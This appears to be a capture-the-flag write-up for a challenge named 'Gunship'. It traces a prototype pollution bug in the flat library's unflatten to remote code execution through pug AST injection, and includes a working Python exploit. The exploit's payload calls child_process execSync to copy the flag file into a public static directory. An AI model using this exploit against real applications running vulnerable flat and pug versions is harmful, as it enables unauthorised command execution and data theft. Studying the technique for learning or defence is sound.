 ## Gunship
 
At the routes/index.js I saw unflatten and pug libraries, with versions 5.0.0 and 3.0.0 respectively 

Then looked what has changed for this version
https://github.com/hughsk/flat/compare/5.0.0...5.0.1
 
At start I saw "Fix prototype pollution on unflatten" string

By this code https://github.com/hughsk/flat/commit/20ef0ef55dfa028caddaedbcb33efbdb04d18e13 I got thought that I can add something to String throught ```__proto__``` and then force pug to execute it.

By googling about the polution I found https://blog.p6.is/AST-Injection/ and use information and code from it to run a shell command that read the flag (by wildcard coz the name is random except prefix) to file in static directory, that available to read.

```python
import requests

URL = "http://138.68.161.230:31811"

requests.post(URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`sh -c 'cat /app/flag*>/app/static/flag'`)"
    }
    })
print(requests.get(URL+'/static/flag').text)
```